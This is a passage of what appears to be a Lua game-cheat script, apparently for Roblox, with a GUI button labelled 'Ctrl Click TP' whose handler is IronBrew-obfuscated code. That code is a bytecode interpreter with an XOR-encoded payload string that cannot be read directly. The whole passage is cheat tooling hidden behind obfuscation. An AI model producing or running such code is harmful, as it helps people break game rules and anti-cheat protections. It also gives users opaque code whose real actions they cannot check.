IIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("FN")]]=IllIllIlIlIlllIlIIll[IIIllIIlIIllIlIIII[#("Yf6")]];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("Kz")]]=lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("A7Q")]][IIIllIIlIIllIlIIII[#("grqO")]];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("Wh")]]=lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#{{812;189;307;402};{436;352;391;246};"1 + 1 = 111";}]][IIIllIIlIIllIlIIII[#("UeUY")]];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];IIIIIIIII=IIIllIIlIIllIlIIII[#("2n")]lIIIllllIllIIlll[IIIIIIIII](IlllIIIIIllIIllIIIIIll(lIIIllllIllIIlll,IIIIIIIII+1,IIIllIIlIIllIlIIII[#("o0T")]))llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];do return end;end;elseif IIllIllIllIllIlIlI<=#("Ff578skXm0bqlOACjEY")then if IIllIllIllIllIlIlI<=#("sAbey1WJisPbcYys3")then do return end;elseif IIllIllIllIllIlIlI>#("LjizLDgkDsJNtJaaNe")then lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("TX")]]=IIlllIlIlIIIIllllIlllllII[IIIllIIlIIllIlIIII[#("opW")]];else lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#{"1 + 1 = 111";{268;706;42;38};}]]=lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#{{610;653;975;113};"1 + 1 = 111";{153;833;945;509};}]][IIIllIIlIIllIlIIII[#("uJpu")]];end;elseif IIllIllIllIllIlIlI<=#{{77;260;236;495};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{180;805;75;789};"1 + 1 = 111";{437;300;887;249};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{394;38;279;517};"1 + 1 = 111";"1 + 1 = 111";{774;131;143;410};"1 + 1 = 111";"1 + 1 = 111";{246;545;4;667};{545;812;868;713};}then local IlllIIIIIllIIllIIIIIll=lllIIIIIIIllIllllIlllI[IIIllIIlIIllIlIIII[#("lUh")]];local IIllIllIllIllIlIlI;local IIIIIIIII={};IIllIllIllIllIlIlI=IlllIllIIlIIlIlIlIlIIlll({},{__index=function(llIlIIlIIllIll,IIIllIIlIIllIlIIII)local IIIllIIlIIllIlIIII=IIIIIIIII[IIIllIIlIIllIlIIII];return IIIllIIlIIllIlIIII[1][IIIllIIlIIllIlIIII[2]];end,__newindex=function(lIIIllllIllIIlll,IIIllIIlIIllIlIIII,llIlIIlIIllIll)local IIIllIIlIIllIlIIII=IIIIIIIII[IIIllIIlIIllIlIIII]IIIllIIlIIllIlIIII[1][IIIllIIlIIllIlIIII[2]]=llIlIIlIIllIll;end;});for IIllIllIllIllIlIlI=1,IIIllIIlIIllIlIIII[#("nFrD")]do llIlIIlIIllIll=llIlIIlIIllIll+1;local IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];if IIIllIIlIIllIlIIII[#("e")]==3 then IIIIIIIII[IIllIllIllIllIlIlI-1]={lIIIllllIllIIlll,IIIllIIlIIllIlIIII[#("FZc")]};else IIIIIIIII[IIllIllIllIllIlIlI-1]={IIlllIlIlIIIIllllIlllllII,IIIllIIlIIllIlIIII[#("C1t")]};end;llIIllIIIIlIlIIIIlllIIIl[#llIIllIIIIlIlIIIIlllIIIl+1]=IIIIIIIII;end;lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("Yo")]]=lIllIlllIlIIlIIlI(IlllIIIIIllIIllIIIIIll,IIllIllIllIllIlIlI,IllIllIlIlIlllIlIIll);elseif IIllIllIllIllIlIlI>#("8myDaF8fbclsodsDNHURq")then lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("Yf")]]=lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("ECi")]][IIIllIIlIIllIlIIII[#("nk7q")]];else local lllIlIlllIIIIl=IIIllIIlIIllIlIIII[#("jC")];local llIlIIlIIllIll=lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("Ts6")]];lIIIllllIllIIlll[lllIlIlllIIIIl+1]=llIlIIlIIllIll;lIIIllllIllIIlll[lllIlIlllIIIIl]=llIlIIlIIllIll[IIIllIIlIIllIlIIII[#("BDSr")]];end;llIlIIlIIllIll=llIlIIlIIllIll+1;end;end);end;return lIllIlllIlIIlIIlI(true,{},llIlllIIIlIIIl())();end)(string.byte,table.insert,setmetatable);
end)

e:Button("Ctrl Click TP",function()
    --[[
IronBrew:tm: obfuscation; Version 2.7.2
]]
return(function(lIlIIllIlI,lIlIIIllIllll,lIllIIIIIIIIIlIlllllllI)local IllllIlIIlllIIllIIIIII=string.char;local lIIlllIlIIIIIIIl=string.sub;local lIlIIlIIIIII=table.concat;local IllIlIllI=math.ldexp;local IlIIllIlIlIlIlIII=getfenv or function()return _ENV end;local lIllIlIlIIIlIlIll=select;local IIllIllIlllIllIlIlIIII=unpack or table.unpack;local lIlIIlIIIIllI=tonumber;local function IIlIllIllII(IIllIllIlllIllIlIlIIII)local lIlIIIIlIIIlIIIIIllIl,IIIIllII,lIllIlllIIIIlllI="","",{}local IIIlllIllIIlllII=256;local IlIlllIIIlllllII={}for lIlIIIllIllll=0,IIIlllIllIIlllII-1 do IlIlllIIIlllllII[lIlIIIllIllll]=IllllIlIIlllIIllIIIIII(lIlIIIllIllll)end;local lIlIIIllIllll=1;local function lIlIIllIlI()local lIlIIIIlIIIlIIIIIllIl=lIlIIlIIIIllI(lIIlllIlIIIIIIIl(IIllIllIlllIllIlIlIIII,lIlIIIllIllll,lIlIIIllIllll),36)lIlIIIllIllll=lIlIIIllIllll+1;local IIIIllII=lIlIIlIIIIllI(lIIlllIlIIIIIIIl(IIllIllIlllIllIlIlIIII,lIlIIIllIllll,lIlIIIllIllll+lIlIIIIlIIIlIIIIIllIl-1),36)lIlIIIllIllll=lIlIIIllIllll+lIlIIIIlIIIlIIIIIllIl;return IIIIllII end;lIlIIIIlIIIlIIIIIllIl=IllllIlIIlllIIllIIIIII(lIlIIllIlI())lIllIlllIIIIlllI[1]=lIlIIIIlIIIlIIIIIllIl;while lIlIIIllIllll<#IIllIllIlllIllIlIlIIII do local lIlIIIllIllll=lIlIIllIlI()if IlIlllIIIlllllII[lIlIIIllIllll]then IIIIllII=IlIlllIIIlllllII[lIlIIIllIllll]else IIIIllII=lIlIIIIlIIIlIIIIIllIl..lIIlllIlIIIIIIIl(lIlIIIIlIIIlIIIIIllIl,1,1)end;IlIlllIIIlllllII[IIIlllIllIIlllII]=lIlIIIIlIIIlIIIIIllIl..lIIlllIlIIIIIIIl(IIIIllII,1,1)lIllIlllIIIIlllI[#lIllIlllIIIIlllI+1],lIlIIIIlIIIlIIIIIllIl,IIIlllIllIIlllII=IIIIllII,IIIIllII,IIIlllIllIIlllII+1 end;return table.concat(lIllIlllIIIIlllI)end;local lIlIIlIIIIllI=IIlIllIllII('24N24T27524U24P27524T25M25O25C25K24U24Q27927125D25O25W25K26726624U24M27926925E25Q25O25D27I27K27M24U24L27926I25K26126825E26026627E27427528326127227M26325G25Q27E25927926W28926726C25F26526028E28G28I27E27Q27526N28T26125E25F24C26H25E26225F27F27925Q29325F25K25Q26124U28B24T28Q28S26126N25K27B29929J29L28T26G25F25L25K25L24U27927827624K27926M25H25O26725O29G27Z24R27928626325K26X25E24U2A027526D25G29H24S27926527924T24H2AT2AQ2AT27524R28Y24T2782AQ2AQ24P2532A124T2B52B727527Q2AX2AX2B927923X24Y2AY2AQ23X2AY24T24V2AT2BP2BP2752BM2BO2BV2A02BU2BR2B22BN2BP2AX24I2792BF24T2AD27624G28M28O29T26126X25W26527E2A224T29V26025C28027926E25K25W25R25E2A829Z27G2752CQ25W26M25E29X27P27R25K25N2612D125F26126725E25D24U2AV27527325G25M25H2D82932DB2DD2AT2502BH24W2BV2752AQ25B2762DU24T2BU2A02A02BL2DY2E22C72752BP2512BG2A02B62792EA2BL23Z2DZ27825B25224T2A02BS2E02EH2E627823X2EQ2EM24T24O2C72EX2BP2C42AQ2EC2BB24T2F12752CA2C22AT28L2EO2752ED2752EF2EP2EI24T2EK2EV2EO2ET2EV2EC2FH2E62AD24R2582BV2572EB2B22F42FW2BA2EE2BG24T2F82G32752FB2BN2C42DV27924V2C82EM2CA27528N27M2CD2CF2CH2772792CL2CN2812CY2CR2CT2CV29A2GS2D02D228X2D52D72D92DO2DE2DG24T2DI2DK2DM2DA2DC25D2AT2F42BY2C52FJ2DY2FM2E52BG2E12FO2E72BV27G2F22FY2792HR2HT2752DR2EG2FI2FK2EN2BH2EU2FP2FN2E62EX2FT2BV24J2FX2FE24T2IB2G12752FU2AX2G52AY2G82AT2ID2HY2FH2EO2EJ2EL2I22BT2I42C02I62EV2FS2EZ24T2IP2F32792IP2G42DZ2792IM2AT2GA2G624V24X27925B23T2HH2BT2C12E02BN2BX2GB2FD2AW2BV2BP2DX2BV2BF2HG2BP2EX2JU2782GE2GC2C02FC2AL2I32C02AQ27G23X2562C027828124R25A2HP2FX2C02DY2B82BN2KK2G624T2552C02AD2HZ2782BP2A42KB2KD24T2KF2KH2KT2BG2AX2CJ2K62KQ2KS2HM2EH2KV24T2742KY2782KE2C72L22JV2G32L62AT2KR2K12G32JC2C6');local lIlIIIllIllll=(bit or bit32);local IIIlllIllIIlllII=lIlIIIllIllll and lIlIIIllIllll.bxor or function(lIlIIIllIllll,lIlIIIIlIIIlIIIIIllIl)local IIIIllII,IIIlllIllIIlllII,lIIlllIlIIIIIIIl=1,0,10 while lIlIIIllIllll>0 and lIlIIIIlIIIlIIIIIllIl>0 do local IlIlllIIIlllllII,lIIlllIlIIIIIIIl=lIlIIIllIllll%2,lIlIIIIlIIIlIIIIIllIl%2 if IlIlllIIIlllllII~=lIIlllIlIIIIIIIl then IIIlllIllIIlllII=IIIlllIllIIlllII+IIIIllII end lIlIIIllIllll,lIlIIIIlIIIlIIIIIllIl,IIIIllII=(lIlIIIllIllll-IlIlllIIIlllllII)/2,(lIlIIIIlIIIlIIIIIllIl-lIIlllIlIIIIIIIl)/2,IIIIllII*2 end if lIlIIIllIllll<lIlIIIIlIIIlIIIIIllIl then lIlIIIllIllll=lIlIIIIlIIIlIIIIIllIl end while lIlIIIllIllll>0 do local lIlIIIIlIIIlIIIIIllIl=lIlIIIllIllll%2 if lIlIIIIlIIIlIIIIIllIl>0 then IIIlllIllIIlllII=IIIlllIllIIlllII+IIIIllII end lIlIIIllIllll,IIIIllII=(lIlIIIllIllll-lIlIIIIlIIIlIIIIIllIl)/2,IIIIllII*2 end return IIIlllIllIIlllII end local function IIIIllII(IIIIllII,lIlIIIllIllll,lIlIIIIlIIIlIIIIIllIl)if lIlIIIIlIIIlIIIIIllIl then local lIlIIIllIllll=(IIIIllII/2^(lIlIIIllIllll-1))%2^((lIlIIIIlIIIlIIIIIllIl-1)-(lIlIIIllIllll-1)+1);return lIlIIIllIllll-lIlIIIllIllll%1;else local lIlIIIllIllll=2^(lIlIIIllIllll-1);return(IIIIllII%(lIlIIIllIllll+lIlIIIllIllll)>=lIlIIIllIllll)and 1 or 0;end;end;local lIlIIIllIllll=1;local function lIlIIIIlIIIlIIIIIllIl()local IlIlllIIIlllllII,IIIIllII,lIIlllIlIIIIIIIl,lIlIIIIlIIIlIIIIIllIl=lIlIIllIlI(lIlIIlIIIIllI,lIlIIIllIllll,lIlIIIllIllll+3);IlIlllIIIlllllII=IIIlllIllIIlllII(IlIlllIIIlllllII,173)IIIIllII=IIIlllIllIIlllII(IIIIllII,173)lIIlllIlIIIIIIIl=IIIlllIllIIlllII(lIIlllIlIIIIIIIl,173)lIlIIIIlIIIlIIIIIllIl=IIIlllIllIIlllII(lIlIIIIlIIIlIIIIIllIl,173)lIlIIIllIllll=lIlIIIllIllll+4;return(lIlIIIIlIIIlIIIIIllIl*16777216)+(lIIlllIlIIIIIIIl*65536)+(IIIIllII*256)+IlIlllIIIlllllII;end;local function lIllIlllIIIIlllI()local lIlIIIIlIIIlIIIIIllIl=IIIlllIllIIlllII(lIlIIllIlI(lIlIIlIIIIllI,lIlIIIllIllll,lIlIIIllIllll),173);lIlIIIllIllll=lIlIIIllIllll+1;return lIlIIIIlIIIlIIIIIllIl;end;local function IlIlllIIIlllllII()local lIlIIIIlIIIlIIIIIllIl,IIIIllII=lIlIIllIlI(lIlIIlIIIIllI,lIlIIIllIllll,lIlIIIllIllll+2);lIlIIIIlIIIlIIIIIllIl=IIIlllIllIIlllII(lIlIIIIlIIIlIIIIIllIl,173)IIIIllII=IIIlllIllIIlllII(IIIIllII,173)lIlIIIllIllll=lIlIIIllIllll+2;return(IIIIllII*256)+lIlIIIIlIIIlIIIIIllIl;end;local function lllIIllllI()local lIlIIIllIllll=lIlIIIIlIIIlIIIIIllIl();local lIlIIIIlIIIlIIIIIllIl=lIlIIIIlIIIlIIIIIllIl();local lIIlllIlIIIIIIIl=1;local IIIlllIllIIlllII=(IIIIllII(lIlIIIIlIIIlIIIIIllIl,1,20)*(2^32))+lIlIIIllIllll;local lIlIIIllIllll=IIIIllII(lIlIIIIlIIIlIIIIIllIl,21,31);local lIlIIIIlIIIlIIIIIllIl=((-1)^IIIIllII(lIlIIIIlIIIlIIIIIllIl,32));if(lIlIIIllIllll==0)then if(IIIlllIllIIlllII==0)then return lIlIIIIlIIIlIIIIIllIl*0;else lIlIIIllIllll=1;lIIlllIlIIIIIIIl=0;end;elseif(lIlIIIllIllll==2047)then return(IIIlllIllIIlllII==0)and(lIlIIIIlIIIlIIIIIllIl*(1/0))or(lIlIIIIlIIIlIIIIIllIl*(0/0));end;return IllIlIllI(lIlIIIIlIIIlIIIIIllIl,lIlIIIllIllll-1023)*(lIIlllIlIIIIIIIl+(IIIlllIllIIlllII/(2^52)));end;local IllIlIllI=lIlIIIIlIIIlIIIIIllIl;local function IIlIllIllII(lIlIIIIlIIIlIIIIIllIl)local IIIIllII;if(not lIlIIIIlIIIlIIIIIllIl)then lIlIIIIlIIIlIIIIIllIl=IllIlIllI();if(lIlIIIIlIIIlIIIIIllIl==0)then return'';end;end;IIIIllII=lIIlllIlIIIIIIIl(lIlIIlIIIIllI,lIlIIIllIllll,lIlIIIllIllll+lIlIIIIlIIIlIIIIIllIl-1);lIlIIIllIllll=lIlIIIllIllll+lIlIIIIlIIIlIIIIIllIl;local lIlIIIIlIIIlIIIIIllIl={}for lIlIIIllIllll=1,#IIIIllII do lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll]=IllllIlIIlllIIllIIIIII(IIIlllIllIIlllII(lIlIIllIlI(lIIlllIlIIIIIIIl(IIIIllII,lIlIIIllIllll,lIlIIIllIllll)),173))end return lIlIIlIIIIII(lIlIIIIlIIIlIIIIIllIl);end;local lIlIIIllIllll=lIlIIIIlIIIlIIIIIllIl;local function IllIlIllI(...)return{...},lIllIlIlIIIlIlIll('#',...)end local function IllllIlIIlllIIllIIIIII()local IIllIllIlllIllIlIlIIII={};local IIIlllIllIIlllII={};local lIlIIIllIllll={};local lIlIIllIlI={[#{{565;23;763;221};"1 + 1 = 111";}]=IIIlllIllIIlllII,[#{{346;280;649;417};"1 + 1 = 111";"1 + 1 = 111";}]=nil,[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]=lIlIIIllIllll,[#{{51;128;298;404};}]=IIllIllIlllIllIlIlIIII,};local lIlIIIllIllll=lIlIIIIlIIIlIIIIIllIl()local lIIlllIlIIIIIIIl={}for IIIIllII=1,lIlIIIllIllll do local lIlIIIIlIIIlIIIIIllIl=lIllIlllIIIIlllI();local lIlIIIllIllll;if(lIlIIIIlIIIlIIIIIllIl==0)then lIlIIIllIllll=(lIllIlllIIIIlllI()~=0);elseif(lIlIIIIlIIIlIIIIIllIl==1)then lIlIIIllIllll=lllIIllllI();elseif(lIlIIIIlIIIlIIIIIllIl==3)then lIlIIIllIllll=IIlIllIllII();end;lIIlllIlIIIIIIIl[IIIIllII]=lIlIIIllIllll;end;for lIlIIIllIllll=1,lIlIIIIlIIIlIIIIIllIl()do IIIlllIllIIlllII[lIlIIIllIllll-1]=IllllIlIIlllIIllIIIIII();end;for lIlIIllIlI=1,lIlIIIIlIIIlIIIIIllIl()do local lIlIIIllIllll=lIllIlllIIIIlllI();if(IIIIllII(lIlIIIllIllll,1,1)==0)then local IIIlllIllIIlllII=IIIIllII(lIlIIIllIllll,2,3);local lIllIlllIIIIlllI=IIIIllII(lIlIIIllIllll,4,6);local lIlIIIllIllll={IlIlllIIIlllllII(),IlIlllIIIlllllII(),nil,nil};if(IIIlllIllIIlllII==0)then lIlIIIllIllll[#{{366;127;874;546};{656;384;984;914};{627;396;560;518};}]=IlIlllIIIlllllII();lIlIIIllIllll[#("rBup")]=IlIlllIIIlllllII();elseif(IIIlllIllIIlllII==1)then lIlIIIllIllll[#("LbJ")]=lIlIIIIlIIIlIIIIIllIl();elseif(IIIlllIllIIlllII==2)then lIlIIIllIllll[#("QpN")]=lIlIIIIlIIIlIIIIIllIl()-(2^16)elseif(IIIlllIllIIlllII==3)then lIlIIIllIllll[#("TDp")]=lIlIIIIlIIIlIIIIIllIl()-(2^16)lIlIIIllIllll[#("sUCr")]=IlIlllIIIlllllII();end;if(IIIIllII(lIllIlllIIIIlllI,1,1)==1)then lIlIIIllIllll[#("RR")]=lIIlllIlIIIIIIIl[lIlIIIllIllll[#("2l")]]end if(IIIIllII(lIllIlllIIIIlllI,2,2)==1)then lIlIIIllIllll[#("Cdl")]=lIIlllIlIIIIIIIl[lIlIIIllIllll[#("0Er")]]end if(IIIIllII(lIllIlllIIIIlllI,3,3)==1)then lIlIIIllIllll[#("kjvc")]=lIIlllIlIIIIIIIl[lIlIIIllIllll[#{{691;755;367;187};"1 + 1 = 111";{426;277;447;701};{808;532;988;439};}]]end IIllIllIlllIllIlIlIIII[lIlIIllIlI]=lIlIIIllIllll;end end;lIlIIllIlI[3]=lIllIlllIIIIlllI();return lIlIIllIlI;end;local function lIlIIlIIIIllI(lIlIIIllIllll,lIllIlllIIIIlllI,IlIlllIIIlllllII)lIlIIIllIllll=(lIlIIIllIllll==true and IllllIlIIlllIIllIIIIII())or lIlIIIllIllll;return(function(...)local lIIlllIlIIIIIIIl=lIlIIIllIllll[1];local IIIlllIllIIlllII=lIlIIIllIllll[3];local IllllIlIIlllIIllIIIIII=lIlIIIllIllll[2];local lIlIIIllIllll=IllIlIllI local IIIIllII=1;local lIlIIIllIllll=-1;local IllIlIllI={};local IIlIllIllII={...};local lIllIlIlIIIlIlIll=lIllIlIlIIIlIlIll('#',...)-1;local lIlIIllIlI={};local lIlIIIIlIIIlIIIIIllIl={};for lIlIIIllIllll=0,lIllIlIlIIIlIlIll do if(lIlIIIllIllll>=IIIlllIllIIlllII)then IllIlIllI[lIlIIIllIllll-IIIlllIllIIlllII]=IIlIllIllII[lIlIIIllIllll+1];else lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll]=IIlIllIllII[lIlIIIllIllll+#{{670;692;358;15};}];end;end;local lIlIIIllIllll=lIllIlIlIIIlIlIll-IIIlllIllIIlllII+1 local lIlIIIllIllll;local IIIlllIllIIlllII;while true do lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];IIIlllIllIIlllII=lIlIIIllIllll[#("0")];if IIIlllIllIIlllII<=#("DYzXqbW8XsstgfbDE")then if IIIlllIllIIlllII<=#{{8;386;143;675};{673;878;773;764};{114;420;938;849};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{411;492;656;462};}then if IIIlllIllIIlllII<=#("bYU")then if IIIlllIllIIlllII<=#("Y")then if IIIlllIllIIlllII>#("")then lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("pf")]]=lIllIlllIIIIlllI[lIlIIIllIllll[#("bZV")]];else lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("F9")]]=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("lNX")]][lIlIIIllIllll[#{{740;122;952;945};"1 + 1 = 111";"1 + 1 = 111";{808;17;206;816};}]];IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=IlIlllIIIlllllII[lIlIIIllIllll[#("nIz")]];IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("JI")]]=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("dup")]][lIlIIIllIllll[#("KDf2")]];IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("Dz")]]=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("Alm")]][lIlIIIllIllll[#("gDDJ")]];IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];if(lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("EZ")]]~=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("Jcxa")]])then IIIIllII=IIIIllII+1;else IIIIllII=lIlIIIllIllll[#("lTC")];end;end;elseif IIIlllIllIIlllII==#("xB")then lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=(lIlIIIllIllll[#("EcS")]~=0);else do return end;end;elseif IIIlllIllIIlllII<=#("OJlUE")then if IIIlllIllIIlllII==#("Kino")then lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("kk")]]=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("YQo")]];else if(lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("5Y")]]==lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("mWP1")]])then IIIIllII=IIIIllII+1;else IIIIllII=lIlIIIllIllll[#("GT4")];end;end;elseif IIIlllIllIIlllII<=#("eDQR1L")then lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("xl")]]=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("pPy")]][lIlIIIllIllll[#("05dr")]];elseif IIIlllIllIIlllII==#("cBeqsHU")then if(lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("4e")]]==lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#{{782;349;310;339};{880;701;845;798};"1 + 1 = 111";"1 + 1 = 111";}]])then IIIIllII=IIIIllII+1;else IIIIllII=lIlIIIllIllll[#{"1 + 1 = 111";"1 + 1 = 111";{965;75;222;826};}];end;else lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("UY")]]=lIlIIIllIllll[#("e5D")];end;elseif IIIlllIllIIlllII<=#("cuELuTLSZGWp")then if IIIlllIllIIlllII<=#("jXmrTc7vdq")then if IIIlllIllIIlllII==#("htt9QypP9")then lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#{"1 + 1 = 111";{184;784;194;358};}]]=lIlIIIllIllll[#("Yn0")];else local IllllIlIIlllIIllIIIIII=IllllIlIIlllIIllIIIIII[lIlIIIllIllll[#("qLi")]];local IIllIllIlllIllIlIlIIII;local IIIlllIllIIlllII={};IIllIllIlllIllIlIlIIII=lIllIIIIIIIIIlIlllllllI({},{__index=function(lIlIIIIlIIIlIIIIIllIl,lIlIIIllIllll)local lIlIIIllIllll=IIIlllIllIIlllII[lIlIIIllIllll];return lIlIIIllIllll[1][lIlIIIllIllll[2]];end,__newindex=function(IIIIllII,lIlIIIllIllll,lIlIIIIlIIIlIIIIIllIl)local lIlIIIllIllll=IIIlllIllIIlllII[lIlIIIllIllll]lIlIIIllIllll[1][lIlIIIllIllll[2]]=lIlIIIIlIIIlIIIIIllIl;end;});for IlIlllIIIlllllII=1,lIlIIIllIllll[#("fpr0")]do IIIIllII=IIIIllII+1;local lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];if lIlIIIllIllll[#("l")]==4 then IIIlllIllIIlllII[IlIlllIIIlllllII-1]={lIlIIIIlIIIlIIIIIllIl,lIlIIIllIllll[#("yXB")]};else IIIlllIllIIlllII[IlIlllIIIlllllII-1]={lIllIlllIIIIlllI,lIlIIIllIllll[#("4nG")]};end;lIlIIllIlI[#lIlIIllIlI+1]=IIIlllIllIIlllII;end;lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("5i")]]=lIlIIlIIIIllI(IllllIlIIlllIIllIIIIII,IIllIllIlllIllIlIlIIII,IlIlllIIIlllllII);end;elseif IIIlllIllIIlllII==#("mpON3TEU1kf")then if not lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("Dr")]]then IIIIllII=IIIIllII+1;else IIIIllII=lIlIIIllIllll[#("t2Y")];end;else if(lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("vp")]]~=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("0PKB")]])then IIIIllII=IIIIllII+1;else IIIIllII=lIlIIIllIllll[#("BER")];end;end;elseif IIIlllIllIIlllII<=#("k3N28KFXY8eIDb")then if IIIlllIllIIlllII>#("LcCqhp57IIPZs")then local lIlIIIllIllll=lIlIIIllIllll[#("Nn")]lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll]=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll](lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll+1])else lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("5J")]]=(lIlIIIllIllll[#("Xin")]~=0);end;elseif IIIlllIllIIlllII<=#("Lmf1WiBxYzQjmGn")then do return end;elseif IIIlllIllIIlllII==#("gj2t3RA48fp5fttU")then lIllIlllIIIIlllI[lIlIIIllIllll[#("Op4")]]=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("ze")]];else if(lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("jJ")]]~=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("SQWt")]])then IIIIllII=IIIIllII+1;else IIIIllII=lIlIIIllIllll[#("KLU")];end;end;elseif IIIlllIllIIlllII<=#("umW8QQ28oocK7dzTxBF79K3Xk3")then if IIIlllIllIIlllII<=#("3FqEf581tCmAE9vPDxtbb")then if IIIlllIllIIlllII<=#("mT2YWmVs9XX99D7V6O8")then if IIIlllIllIIlllII==#("fqjbb8N4BA01PdrHLr")then lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("S6")]]=lIllIlllIIIIlllI[lIlIIIllIllll[#("0Jo")]];else local IllllIlIIlllIIllIIIIII=IllllIlIIlllIIllIIIIII[lIlIIIllIllll[#("KMy")]];local IIllIllIlllIllIlIlIIII;local IIIlllIllIIlllII={};IIllIllIlllIllIlIlIIII=lIllIIIIIIIIIlIlllllllI({},{__index=function(lIlIIIIlIIIlIIIIIllIl,lIlIIIllIllll)local lIlIIIllIllll=IIIlllIllIIlllII[lIlIIIllIllll];return lIlIIIllIllll[1][lIlIIIllIllll[2]];end,__newindex=function(IIIIllII,lIlIIIllIllll,lIlIIIIlIIIlIIIIIllIl)local lIlIIIllIllll=IIIlllIllIIlllII[lIlIIIllIllll]lIlIIIllIllll[1][lIlIIIllIllll[2]]=lIlIIIIlIIIlIIIIIllIl;end;});for IlIlllIIIlllllII=1,lIlIIIllIllll[#("VVZZ")]do IIIIllII=IIIIllII+1;local lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];if lIlIIIllIllll[#("q")]==4 then IIIlllIllIIlllII[IlIlllIIIlllllII-1]={lIlIIIIlIIIlIIIIIllIl,lIlIIIllIllll[#("npi")]};else IIIlllIllIIlllII[IlIlllIIIlllllII-1]={lIllIlllIIIIlllI,lIlIIIllIllll[#("WH1")]};end;lIlIIllIlI[#lIlIIllIlI+1]=IIIlllIllIIlllII;end;lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("hO")]]=lIlIIlIIIIllI(IllllIlIIlllIIllIIIIII,IIllIllIlllIllIlIlIIII,IlIlllIIIlllllII);end;elseif IIIlllIllIIlllII>#("WgaCzNE92RSBPc0U5J1W")then lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("0S")]]=IlIlllIIIlllllII[lIlIIIllIllll[#("hiQ")]];else local IIIIllII=lIlIIIllIllll[#("H9")]lIlIIIIlIIIlIIIIIllIl[IIIIllII](IIllIllIlllIllIlIlIIII(lIlIIIIlIIIlIIIIIllIl,IIIIllII+1,lIlIIIllIllll[#("Gf1")]))end;elseif IIIlllIllIIlllII<=#("J02K65t6kAjOFlefZVyH8Un")then if IIIlllIllIIlllII>#("8lZZsx7TGvnqi2CRkdSqIW")then local IIIIllII=lIlIIIllIllll[#("yy")];local 